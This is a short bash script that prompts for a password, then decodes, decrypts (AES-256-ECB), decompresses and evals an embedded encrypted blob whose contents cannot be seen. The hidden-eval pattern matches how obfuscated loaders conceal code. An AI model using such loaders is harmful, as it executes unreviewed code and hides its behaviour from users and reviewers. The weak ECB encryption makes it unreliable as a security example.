#!/bin/bash
read -p "Please provide a password: " PASSWORD
eval "$(echo "U2FsdGVkX19l5vUXw+MGNOtYM/bqVAIAKLicGiU2MpbLsrhEMJZoxoHK1hMWtoLg" | base64 -d | openssl enc -d -AES-256-ECB -in /dev/stdin -out /dev/stdout -k "$PASSWORD" | gunzip)"
